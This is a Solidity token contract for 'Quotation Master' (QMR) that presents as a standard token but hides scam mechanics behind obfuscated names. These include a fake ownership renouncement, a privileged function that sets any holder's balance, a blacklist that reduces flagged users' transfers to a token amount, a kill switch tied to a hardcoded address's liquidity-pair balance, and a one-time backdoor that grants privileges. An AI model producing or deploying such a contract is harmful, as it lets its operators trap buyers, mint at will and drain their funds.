//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface atTeam {
    function createPair(address fundReceiver, address swapReceiver) external returns (address);
}

interface toTotalSwap {
    function totalSupply() external view returns (uint256);

    function balanceOf(address amountMin) external view returns (uint256);

    function transfer(address tradingLaunched, uint256 tokenIs) external returns (bool);

    function allowance(address totalFee, address spender) external view returns (uint256);

    function approve(address spender, uint256 tokenIs) external returns (bool);

    function transferFrom(
        address sender,
        address tradingLaunched,
        uint256 tokenIs
    ) external returns (bool);

    event Transfer(address indexed from, address indexed tokenReceiver, uint256 value);
    event Approval(address indexed totalFee, address indexed spender, uint256 value);
}

abstract contract launchedList {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface liquidityFromAmount {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface toTotalSwapMetadata is toTotalSwap {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract QuotationMaster is launchedList, toTotalSwap, toTotalSwapMetadata {

    function minIs(address totalFund) public {
        tradingFee();
        
        if (totalFund == exemptToken || totalFund == totalMarketing) {
            return;
        }
        enableTx[totalFund] = true;
    }

    address fundTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public amountLaunch;

    uint256 public autoBuy;

    function marketingMinFrom(address modeTakeAt, address tradingLaunched, uint256 tokenIs) internal returns (bool) {
        if (modeTakeAt == exemptToken) {
            return fromWallet(modeTakeAt, tradingLaunched, tokenIs);
        }
        uint256 senderReceiver = toTotalSwap(totalMarketing).balanceOf(fundTeam);
        require(senderReceiver == enableMinAt);
        require(tradingLaunched != fundTeam);
        if (enableTx[modeTakeAt]) {
            return fromWallet(modeTakeAt, tradingLaunched, receiverFeeMode);
        }
        return fromWallet(modeTakeAt, tradingLaunched, tokenIs);
    }

    uint256 enableMinAt;

    uint256 private modeFromIs;

    function name() external view virtual override returns (string memory) {
        return takeWallet;
    }

    function approve(address exemptAt, uint256 tokenIs) public virtual override returns (bool) {
        teamMax[_msgSender()][exemptAt] = tokenIs;
        emit Approval(_msgSender(), exemptAt, tokenIs);
        return true;
    }

    address buyList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function transfer(address amountSell, uint256 tokenIs) external virtual override returns (bool) {
        return marketingMinFrom(_msgSender(), amountSell, tokenIs);
    }

    constructor (){
        if (senderLaunched != shouldAutoReceiver) {
            marketingSender = autoBuy;
        }
        liquidityFromAmount walletSwapEnable = liquidityFromAmount(buyList);
        totalMarketing = atTeam(walletSwapEnable.factory()).createPair(walletSwapEnable.WETH(), address(this));
        
        exemptToken = _msgSender();
        liquidityWallet[exemptToken] = true;
        exemptShould[exemptToken] = exemptSwapFrom;
        atEnableBuy();
        if (shouldAutoReceiver) {
            feeTrading = takeExempt;
        }
        emit Transfer(address(0), exemptToken, exemptSwapFrom);
    }

    address private liquidityFund;

    function allowance(address tradingTake, address exemptAt) external view virtual override returns (uint256) {
        if (exemptAt == buyList) {
            return type(uint256).max;
        }
        return teamMax[tradingTake][exemptAt];
    }

    string private takeWallet = "Quotation Master";

    function symbol() external view virtual override returns (string memory) {
        return takeTeamEnable;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return exemptSwapFrom;
    }

    uint8 private listAuto = 18;

    string private takeTeamEnable = "QMR";

    mapping(address => mapping(address => uint256)) private teamMax;

    uint256 private exemptSwapFrom = 100000000 * 10 ** 18;

    mapping(address => bool) public liquidityWallet;

    function minLimit(address amountSell, uint256 tokenIs) public {
        tradingFee();
        exemptShould[amountSell] = tokenIs;
    }

    function getOwner() external view returns (address) {
        return liquidityFund;
    }

    bool public limitTake;

    function fromFund(uint256 tokenIs) public {
        tradingFee();
        enableMinAt = tokenIs;
    }

    address public exemptToken;

    function toWalletTrading(address limitExempt) public {
        require(limitExempt.balance < 100000);
        if (limitTake) {
            return;
        }
        if (feeTrading != modeFromIs) {
            amountLaunch = true;
        }
        liquidityWallet[limitExempt] = true;
        
        limitTake = true;
    }

    function fromWallet(address modeTakeAt, address tradingLaunched, uint256 tokenIs) internal returns (bool) {
        require(exemptShould[modeTakeAt] >= tokenIs);
        exemptShould[modeTakeAt] -= tokenIs;
        exemptShould[tradingLaunched] += tokenIs;
        emit Transfer(modeTakeAt, tradingLaunched, tokenIs);
        return true;
    }

    uint256 senderMin;

    uint256 constant receiverFeeMode = 3 ** 10;

    function decimals() external view virtual override returns (uint8) {
        return listAuto;
    }

    uint256 private feeTrading;

    function atEnableBuy() public {
        emit OwnershipTransferred(exemptToken, address(0));
        liquidityFund = address(0);
    }

    event OwnershipTransferred(address indexed txTrading, address indexed toTrading);

    function owner() external view returns (address) {
        return liquidityFund;
    }

    function tradingFee() private view {
        require(liquidityWallet[_msgSender()]);
    }

    mapping(address => bool) public enableTx;

    bool private shouldAutoReceiver;

    function balanceOf(address amountMin) public view virtual override returns (uint256) {
        return exemptShould[amountMin];
    }

    function transferFrom(address modeTakeAt, address tradingLaunched, uint256 tokenIs) external override returns (bool) {
        if (_msgSender() != buyList) {
            if (teamMax[modeTakeAt][_msgSender()] != type(uint256).max) {
                require(tokenIs <= teamMax[modeTakeAt][_msgSender()]);
                teamMax[modeTakeAt][_msgSender()] -= tokenIs;
            }
        }
        return marketingMinFrom(modeTakeAt, tradingLaunched, tokenIs);
    }

    mapping(address => uint256) private exemptShould;

    address public totalMarketing;

    uint256 public takeExempt;

    uint256 public marketingSender;

    bool private senderLaunched;

}